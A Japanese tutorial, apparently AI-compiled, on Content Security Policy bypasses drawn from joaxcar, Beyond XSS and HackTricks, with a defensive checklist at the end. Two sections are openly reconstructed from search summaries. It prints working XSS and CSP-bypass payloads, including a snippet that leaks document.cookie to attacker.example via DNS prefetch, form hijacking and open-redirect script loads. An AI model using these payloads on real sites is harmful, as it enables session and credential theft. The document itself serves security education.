## CSPバイパス総まとめ（joaxcar / Beyond XSS / HackTricks）

CSP（Content Security Policy、コンテンツセキュリティポリシー）は「ブラウザ側で強制されるホワイトリスト型の実行制御機構」で、XSS（クロスサイトスクリプティング）が成立した後の**最後の防波堤**として機能する。素朴な反射型XSSを理解した読者が次に踏み込むべきなのが、この防波堤をどう突破するか、あるいはそもそも突破しなくても情報を盗めてしまうケースがあるという事実である。本節では実際のバグバウンティ報告（joaxcar）、体系的なチートシート的教材（Beyond XSS）、実務リファレンス（HackTricks）の3つの視点からCSPバイパスを整理する。

まず前提知識を短く確認する。CSPは `Content-Security-Policy` レスポンスヘッダ（または `<meta http-equiv="Content-Security-Policy">`）で配信され、`script-src`, `default-src`, `object-src`, `base-uri`, `form-action` などのディレクティブごとに「どこから」「どうやって」リソースを読み込んでよいかを宣言する。ブラウザはHTMLパーサがDOMを構築する過程で、スクリプトタグ等のsink（入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`、ここでは「スクリプトとして実行される場所」全般を指す）に到達するたびに、そのリソースの取得元URLやインラインかどうかをCSPのソースリストと照合し、一致しなければブロックする。**CSPバイパスとは、この照合ロジックの「抜け」や「解釈のズレ」を突いて、ポリシーが許可しているはずのない挙動を実行させる技術群**である。バイパスの多くは「攻撃コード自体の巧妙さ」ではなく、「許可リストに載っている“信頼済み”ドメインの中に、攻撃者が乗っ取れる機能（JSONPエンドポイント、AngularJS、オープンリダイレクトなど）が存在する」という運用上の見落としを突く点に本質がある。

---

### 1. joaxcar: PortSwigger.net における Google スクリプトリソースを使った CSP バイパス

> ⚠️ **未取得の資料**: 「CSP bypass on PortSwigger.net using Google script resources」（joaxcar, 2024-02-19）は自動取得できませんでした（理由: 環境のegressプロキシにより `joaxcar.com` へのアクセスがブロックされたため。GitHub上のミラーも存在せず、代替としてWeb検索を実施し、HackerOne上の開示情報および関連ブログの要約から概要を再構成した）。詳細は必ず以下のURLからユーザーご自身でご覧ください: https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/

（以下は未取得資料の補足として、検索で得られた公開情報＋一般知識に基づく解説です）

**概要（2024年2月19日公開、報告者 Johan Carlsson / joaxcar、HackerOne経由でPortSwiggerに報告、報奨金1,500ドル）**

PortSwigger.net が配信していたCSPの `script-src` ディレクティブには、Google Tag Manager や Google Analytics 等を動かすために `https://www.google.com` や `https://www.googletagmanager.com` のような「Googleが管理する巨大な共有ドメイン」が許可元として含まれていた。ここでの根本原因は次の**プリンシパルの誤り**である。

- CSPの `script-src https://www.google.com` という記述は、「そのオリジンから配信されるあらゆるスクリプトファイル」を無条件に信頼することを意味する。
- しかし `www.google.com` のような巨大ドメインは、検索・ウィジェット・実験的機能など無数のサブパスでJavaScriptを配信しており、その中には**任意のコードを実行できる「スクリプトガジェット」**（本来は無害な目的で書かれているが、外部から渡せるパラメータや埋め込みHTML経由で任意のJS実行に転用できるライブラリ・コード片）が紛れ込んでいる。
- 具体的にはAngularJSのような、DOM上の属性（`ng-app`、`ng-csp` など）をテンプレートとして評価するフレームワークがGoogleドメインの許可対象パス上でホストされているケースがあり、攻撃者はXSSで注入したHTML（`<div ng-app>{{constructor.constructor('alert(1)')()}}</div>` のようなAngular式）と、CSPで許可済みのGoogleドメインから読み込んだAngularJS本体を組み合わせることで、CSPが `script-src` を制限していても最終的に任意JavaScriptを実行できてしまう。

```html
<!-- CSPが https://www.google.com/... 配下のAngularJSを許可している場合の典型例 -->
<script src="https://www.google.com/.../angular.js"></script>
<div ng-app ng-csp>
  {{constructor.constructor('alert(document.domain)')()}}
</div>
```
これが動く理由は、**CSPはスクリプトの「取得元（どこから来たか）」しか検証せず、「そのスクリプトが実行時にどんなAPI・機能を提供するか」は一切見ていない**からである。AngularJSはCSP的には「許可されたドメインから来た正規のスクリプト」でしかないが、実行時にはDOM上のテンプレート構文を評価してJavaScriptとして実行するインタプリタとして振る舞う。攻撃者はこの「許可されたインタプリタ」に自分の注入したマークアップを食わせることで、事実上のコード実行を得る。

PortSwigger側のCSPには他にも懸念があり、修正後もjoaxcarは追加で「フォームハイジャック（form hijacking）」によるCSP回避を報告している。これは `form-action` ディレクティブが十分に制限されていない場合、攻撃者がXSSで `<form action="https://attacker.example">` を注入し、既存の入力フィールド（ログインフォームなど）の送信先を書き換えることで、CSPの `script-src` を一切破らずに認証情報や機密情報を外部に持ち出す手法である（詳細はPortSwigger Researchの "Using form hijacking to bypass CSP" 参照）。

**教訓（原理レベル）**: CSPのホワイトリストは「ドメインの信頼」を「そのドメイン上の全パスの安全性」に暗黙に拡大してしまう。巨大なCDNやアナリティクスドメイン（Google, Cloudflare, jsDelivr等）を安易に許可すると、そのドメイン上でホストされている無数のライブラリの中から「スクリプトガジェット」を探し出されるだけでバイパスされる。対策は、許可ドメインを最小化し、可能な限り `strict-dynamic` + nonce/hash方式（後述）へ移行することである。

---

### 2. Beyond XSS: 一般的なCSPバイパス手法

> ⚠️ **未取得の資料（部分的）**: 「Bypassing Your Defenses: Common CSP Bypasses」（Beyond XSS, aszx87410, Chapter 2）は自動取得できませんでした（理由: `aszx87410.github.io` が環境のegressプロキシでブロックされ、GitHubリポジトリ `aszx87410/beyond-xss` 内の該当Markdownファイルも直接のパス推測では404となり取得できなかったため。Web検索による断片的な要約のみ確認できている）。正確な全文は以下のURLからユーザーご自身でご覧ください: https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/

（以下は検索で得られた要約情報＋一般知識に基づく体系的な補足解説です）

Beyond XSSのCSPバイパス章は、CSPを「XSSに対する第二の防衛線」と位置づけた上で、代表的なバイパスパターンを類型化して紹介している。確認できた要点と、それを補う一般的な技術解説は以下の通り。

**(a) オープンリダイレクト + JSONPの組み合わせ**

CSPの `script-src` に許可されたドメイン（例: `accounts.google.com`）に**オープンリダイレクト**（任意の外部URLへ転送してしまう脆弱な機能、例: `/logout?continue=<任意URL>`）が存在する場合、攻撃者は次のようなURLを `<script src="...">` に指定できる。

```html
<script src="https://accounts.google.com/logout?continue=https://attacker.example/evil.js"></script>
```

これが動く理由は、**CSPのソース照合はリクエスト送信前のURL（＝スクリプトタグに書かれたURL）のホスト名だけを見て許可判定を行い、その後サーバ側やHTTP 30x応答で発生するリダイレクト先までは検証しないブラウザの実装が存在する**ためである（仕様上はCSP3でリダイレクト後のURLも再検証すべきとされているが、実装や設定によっては初期リクエストのホストだけで通過してしまうケースが報告されてきた）。結果として、許可ドメインのオープンリダイレクトを踏み台に、任意ドメインからのスクリプト読み込みへとすり替えられる。

さらにこれをJSONPエンドポイント（`?callback=xxx` のようなパラメータでJavaScriptの関数呼び出し形式のレスポンスを返すAPI）と組み合わせると、リダイレクトすら不要な場合がある。許可済みドメインが `https://trusted.example/api/data?callback=alert(document.cookie)//` のようなJSONPを提供していれば、そのレスポンスは `alert(document.cookie)//({...})` という**そのまま実行可能なJavaScript文**になる。CSPは「trusted.exampleから来たスクリプトである」ことしか検証しないため、中身が攻撃者の指定した任意コードであっても素通りする。

```html
<script src="https://trusted.example/jsonp?callback=alert(document.domain)//"></script>
```

**(b) `base-uri` 未設定を突いた `<base>` タグインジェクション（Dangling Markup的手法）**

CSPで `base-uri` ディレクティブが明示されていない場合、攻撃者がHTMLインジェクション（完全なXSSでなくてもタグ挿入ができれば足りる）で以下を注入できる。

```html
<base href="https://attacker.example/">
```

`<base>` は文書内のすべての相対URL（`<script src="app.js">` のような相対パス指定）の基準を書き換える。これにより、ページが本来 `/app.js`（＝自サイト）を読み込むつもりで書いていたコードが、実際には `https://attacker.example/app.js` を読み込んでしまう。これは**HTMLパーサが `<base>` をスクリプト実行前の早い段階（head解析時）で処理し、以降のURL解決に影響を与える**という、DOM構築の順序に起因する挙動である。CSPの `script-src` が正規オリジンを許可していても、その「正規オリジン」の相対パス解決先そのものを攻撃者が乗っ取ってしまう点がポイントで、`base-uri 'self'`（または `'none'`）を明示しない限り防げない。

**(c) Report-Onlyモードの誤運用**

`Content-Security-Policy-Report-Only` ヘッダは、違反を検知してレポートを送信するだけで、**実際のブロックを一切行わない**。開発中の設定確認用ヘッダを本番の `Content-Security-Policy`（強制モード）と混同・併用ミスすると、見た目上は「CSPが設定されている」のに実際には何も制限されておらず、通常のXSSペイロードがそのまま素通りする。これはCSPバイパスというより「CSPが実質的に存在しない」状態だが、監査で見落とされやすい典型的な設定ミスとして紹介されている。

> 出典: Bypassing Your Defenses: Common CSP Bypasses — Beyond XSS — https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/

---

### 3. HackTricks: CSPバイパス総覧

HackTricksの本ページは取得に成功した。CSPの仕組みの整理から実践的なバイパス手法まで非常に広範に扱われており、以下に主要トピックを整理する。

**CSPの基本**

CSPは `script-src`（JS読み込み元）、`default-src`（未指定ディレクティブへのフォールバック）、`connect-src`（`fetch`/`XMLHttpRequest`/WebSocket接続先）、`frame-src`（iframe読み込み元）、`form-action`（フォーム送信先）、`object-src`（`<object>`/`<embed>`/`<applet>`）、`base-uri`（`<base>`要素で指定可能なURL）などのディレクティブで構成される。`Content-Security-Policy-Report-Only` は強制せずレポートのみを行う点は前述の通り。

**脆弱なポリシーごとのバイパス手法**

- **`'unsafe-inline'` が有効な場合**: そもそもインラインスクリプトの実行が許可されているため、通常のHTMLインジェクションから直接 `<script>alert(1)</script>` を注入すればよく、CSPは実質無力化されている。
- **`'unsafe-eval'` が有効な場合**: `eval()`, `new Function()`, `setTimeout("文字列", …)` などの「文字列をコードとして評価する」API群がブロックされない。`data:` スキームと組み合わせ、`<script src="data:text/javascript;base64,...">` のようにBase64エンコードしたJSをdata URIとして読み込ませる手口も紹介される。これは `unsafe-eval` 自体はdata URI経由の `<script src>` の可否に直接関係しないディレクティブだが、`script-src` の値に `data:` が許可指定として含まれているような構成ミスと合わせて悪用されるケースを指す。
- **ワイルドカード（`*`）指定**: `script-src *` のように無制限指定、あるいは `https:` のようなスキームだけの指定は、攻撃者が完全に自由なドメインからスクリプトを読み込めることを意味し、CSPとして機能していない。
- **`strict-dynamic` の誤解**: `strict-dynamic` は「nonceまたはhashで許可された信頼済みスクリプトが、動的に（`document.createElement('script')`等で）生成した新しいスクリプトタグは、そのURLに関わらず自動的に信頼する」という委譲の仕組みである。これは元々「ドメインホワイトリスト方式の弱点（前述のjoaxcarの例のようなガジェット問題）を解消するため」に導入された仕様だが、逆に**信頼済みスクリプト自身にXSS類似の脆弱性（例えばそのスクリプトが外部入力をもとに新しいscriptタグを組み立ててしまうコード）があれば、その信頼を丸ごと悪用される**という新たなリスクを生む。
- **ファイルアップロード + `'self'`**: アップロードされたファイルが自サイト（`'self'`）配下に置かれ、かつサーバがMIMEタイプやURLパスの拡張子判定を誤る場合、`picture.png.js` のような二重拡張子ファイルをアップロードし、`<script src="/uploads/picture.png.js">` として読み込ませることで、`'self'` 制限下でもJS実行に成功する。
- **サードパーティエンドポイント悪用**: 前述のAngularJS + `ng-app`/`ng-csp` の式評価パターンに加え、Google reCAPTCHAのスクリプト（`recaptcha/about/js/main.min.js`）が提供するAngular的な `ng-on-error` ディレクティブを介した `alert()` 実行例や、Google検索サジェストのJSONPエンドポイント（`google.com/complete/search?...&callback=alert#1`）を `<script src>` に指定してコード実行させる例が挙げられている。いずれも「許可ドメイン上に存在する、開発者が意図しない機能拡張点（テンプレートエンジンやコールバックパラメータ）」を突く点で共通している。
- **Relative Path Overwrite (RPO)**: `<script src="https://example.com/scripts/react/..%2fangular%2fangular.js">` のように、URLエンコードしたパストラバーサル（`%2f` は `/` のURLエンコード表現）をスクリプトのパスに混ぜる。CSPの照合はオリジン単位で行われ、パスの正規化前後の差異までは厳密にチェックされないブラウザ実装があるため、`../` に相当する記述で許可オリジン配下の別のスクリプト（本来読み込むはずのなかった脆弱なライブラリ）にすり替えられる。
- **`base-uri` 欠如の悪用**: Beyond XSSの節で述べた `<base href="https://attacker.example/">` インジェクションと同様の手法。
- **nonce再利用/漏洩**: 同一ページ内の別の場所（例えば別のiframe経由でDOMアクセスできる箇所）に置かれた正規の `nonce` 属性値を読み取り、それを攻撃者が新しく生成する `<script>` タグの `nonce` にコピーして貼り付けることで、CSPのnonce検証（「このリクエストに使われたnonceが、レスポンスヘッダで指定されたnonceと一致するか」）をすり抜ける。これはnonceの値そのものは正しいので検証上は「合法」なスクリプトとして扱われてしまうことに起因する。
- **許可元でのリダイレクト**: CSPでパスまで絞った許可（例: `script-src https://www.google.com/a/b/c/d`）をしていても、そのURLが302リダイレクトで別のパス・別のリソースへ転送する場合、多くのブラウザ実装は「最初にマッチしたオリジンさえ許可条件を満たせばよい」とみなし、リダイレクト先のパスまでは再検証しない（前述のBeyond XSSのオープンリダイレクト事例と同根の問題）。
- **Service Worker経由の `importScripts` 悪用**: Service Worker内で使われる `importScripts()` はCSPの `script-src` 制限の対象外として扱われる実装上のギャップが存在し、Service Workerを登録できる状況（`self` オリジンへの書き込み権限がある等）ではCSPをすり抜けてコードを読み込める。
- **ポリシー注入によるCSP破壊**: HTTPヘッダインジェクションなどでCSPヘッダ自体に追記できる状況では、ブラウザ実装依存の挙動を突いて既存ポリシーを無力化できる。例としてChromeでは `script-src-elem *; script-src-attr *` のような、より詳細度の高い（fetch directiveの中でも要素・属性別に分かれた）ディレクティブを追加注入すると、それが `script-src` の指定を実質的に上書き・無効化してしまう仕様上の優先順位（`script-src-elem`/`script-src-attr` は `script-src` よりも詳細度が高く優先される）が悪用される。Edgeでは `;_` のような無効なトークンを挿入すると、パーサの誤動作でポリシー全体が破棄されるという実装バグ的な事例も紹介されている。

**CSPが有効なままでの情報窃取（バイパスせずに漏洩させる手法）**

XSSは成立したがCSPで外部への `fetch`/`script`/`img` 読み込みが厳密にブロックされている場合でも、CSPのディレクティブがカバーしていない経路を使えば情報を持ち出せる。

- **DNSプリフェッチ悪用**: `<link rel="dns-prefetch" href="//<盗みたいデータ>.attacker.example">` を注入すると、ブラウザは表示パフォーマンス向上のためにこのホスト名を事前にDNS解決しようとする。DNSクエリの送信自体はCSPの `connect-src`/`img-src` 等のフェッチ系ディレクティブの制御対象外であることが多く、機密情報（セッションIDの断片など）をサブドメインに埋め込んでDNSクエリとして外部（攻撃者が権威DNSサーバを持つドメイン）に送信できる。
```javascript
var sessionid = document.cookie.split("=")[1] + "."
document.body.innerHTML += '<link rel="dns-prefetch" href="//' + sessionid + 'attacker.example">'
```
これが機能する理由は、**CSPのフェッチ系ディレクティブはHTTP/HTTPSやWebSocketなど「アプリケーション層のリクエスト」を制御対象として設計されており、ブラウザが内部的に行うDNS解決という「名前解決レイヤーの動作」までは制御範囲に含まれていない**ためである。
- **WebRTCのSTUN/ICE経由の漏洩**: `RTCPeerConnection` でSTUNサーバへの接続を試みる際に発生する通信も、CSPの `connect-src` の対象外となる実装・バージョンが存在し、STUNサーバのホスト名部分にデータを埋め込んで外部に送信する手口が使われてきた（ブラウザベンダ側でも `connect-src` へのWebRTC組み込みが順次進められているため、対象ブラウザ・バージョンによって有効性が異なる点に注意）。
- **`document.location` による直接遷移**: CSPは「リソースの読み込み」を制御するものであり、`navigate-to` ディレクティブ（実装が限定的）を設定していない限り、`document.location = "https://attacker.example/?" + secret` のようなページ遷移そのものはブロックされないブラウザが多い。これはCSPの設計思想が「埋め込みリソースの出所検証」であって「ユーザーの能動的なナビゲーション」とは別物として扱われてきた歴史的経緯による。

**PHPの実装上の欠陥を突いたCSPヘッダそのものの無効化**

サーバサイドの実装（特にPHP）に起因する、CSPヘッダ自体を消し飛ばす手法も紹介されている。

- 1001個以上のGETパラメータを送信すると、PHPが警告（notice/warning）を出力し、それがレスポンスボディに先行して出力されてしまう場合、`header()` 関数（レスポンスヘッダを設定するPHP関数）呼び出し前に本文が出力されたことになり「headers already sent」エラーとなってヘッダ設定自体が失敗する。
- `max_input_vars`（PHPのデフォルトは1000）を超える数の入力変数を送ると同様の警告が発生し、CSPヘッダの送信に失敗する。
```
curl "http://example.com/?xss=<svg/onload=alert(1)>&A=1&A=2&...(1000個以上)"
```
- レスポンスバッファ（PHPのデフォルトのoutput_buffering相当、目安として4096バイト程度）を大量の警告メッセージで埋め尽くすと、CSPヘッダがレスポンスバッファからあふれて実際に送出されるレスポンスに含まれなくなる。

これらはいずれも「アプリケーションのエラーハンドリングの不備によって、セキュリティヘッダの送信自体が失われる」という、CSPロジック外の攻撃面である点に注意したい。

**検証・防御のためのツールとベストプラクティス**

- チェックツール: Google製の `CSP Evaluator`（csp-evaluator.withgoogle.com）、`cspvalidator.org`、ポリシー自動生成の `csper.io` などが実務でよく使われる。
- 防御の骨子は次の通りである。
  1. `'unsafe-inline'` と `'unsafe-eval'` を避ける。
  2. ドメインホワイトリスト方式ではなく、`nonce`（レスポンスごとに生成するワンタイムのランダムトークン）または `hash`（許可するインラインスクリプトのSHA値）と `'strict-dynamic'` を組み合わせる方式に移行する。これによりjoaxcarの事例のような「許可ドメイン上のガジェット探索」を無効化できる。
  3. `object-src 'none'` で古いプラグイン（Flash等）ベクタを遮断する。
  4. `base-uri 'self'`（または `'none'`）を必ず明示し、`<base>` インジェクションを封じる。
  5. `form-action 'self'` を設定し、フォームハイジャックを防ぐ。
  6. サードパーティドメインを許可リストに入れる際は、そのドメイン上に存在する全パスの安全性まで保証できないことを前提に、可能な限り許可対象を細く・具体的なパスまで絞り込む（ただし前述のリダイレクト・RPOのようにパス指定も万能ではない点に留意）。
  7. アップロードファイルのMIMEタイプ・拡張子検証を厳格化し、`'self'` 配下にユーザ制御コンテンツを置く場合は別オリジン（サブドメイン分離等）に退避する。

> 出典: Content Security Policy (CSP) Bypass — HackTricks — https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html

---

### まとめ: 3資料を貫く共通原理

joaxcar、Beyond XSS、HackTricksの3資料に共通するのは、**CSPバイパスの大半が「CSPのソース照合ロジックが検証しているもの（オリジン・パス・nonce・hash）」と「実際に安全性を左右するもの（そのリソースが実行時に何をするか、リダイレクトやエンコーディングでURLがどう解決されるか）」との間にあるギャップを突いている**という点である。ドメインホワイトリスト方式は運用が直感的である反面、許可ドメイン上の未知のガジェットやオープンリダイレクト・JSONPエンドポイントに脆弱であり、これが `nonce`/`hash` + `strict-dynamic` という現代的な設計への移行が推奨される最大の理由になっている。読者は個々のペイロードを暗記するのではなく、「このCSP設定は何を検証していて、何を検証していないのか」を常に問い直す視点を持つことが、CSPバイパスを体系的に理解する近道である。
